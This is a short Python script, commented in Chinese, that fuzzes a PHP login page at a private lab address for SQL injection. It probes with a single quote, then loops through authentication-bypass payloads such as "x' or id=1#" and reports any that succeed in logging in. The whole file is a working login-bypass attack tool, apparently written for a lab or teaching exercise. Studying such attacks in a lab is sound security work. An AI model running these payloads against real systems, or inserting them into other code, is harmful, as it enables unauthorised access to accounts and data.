# coding:utf-8
import requests

# 利用Python对PHP的登录页面进行Fuzz测试

def login_fuzz():
    # 先使用单引号进行探索
    url = 'http://192.168.88.130/security/login.php'
    data = {'username':"'",'password':'admin123','vcode':'0000'}
    resp = requests.post(url=url,data=data)

    if resp.status_code != 200:
        print('本登录功能可能存在SQL注入漏洞')
        # 如果单引号存在利用嫌疑，则继续利用
        payload_list = ["x' or id=1#","x' or uid=1#","x' or userid=1#",
                        "x' or userid=2#","' or userid=1#"]
        for username in payload_list:
            data = {'username':username,'password':'admin123','vcode':'0000'}
            resp = requests.post(url,data)
            if 'login-fail' not in resp.text and resp.status_code==200:
                print(f'登录成功!,Payload为：{data}')
    else:
        print('登录界面对单引号不敏感')

if __name__=='__main__':
    login_fuzz()